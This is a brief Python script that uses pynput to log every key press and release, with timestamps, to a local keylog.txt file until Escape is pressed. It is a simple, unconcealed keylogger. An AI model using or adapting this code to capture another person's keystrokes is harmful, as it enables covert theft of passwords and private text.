from pynput import keyboard
import datetime

# Function to handle key press events
def on_press(key):
    try:
        with open("keylog.txt", "a") as log:
            log.write(f"{datetime.datetime.now()} - Key down: {key.char}\n")
    except AttributeError:
        with open("keylog.txt", "a") as log:
            log.write(f"{datetime.datetime.now()} - Key down: {key}\n")

# Function to handle key release events
def on_release(key):
    with open("keylog.txt", "a") as log:
        log.write(f"{datetime.datetime.now()} - Key up: {key}\n")
    if key == keyboard.Key.esc:
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
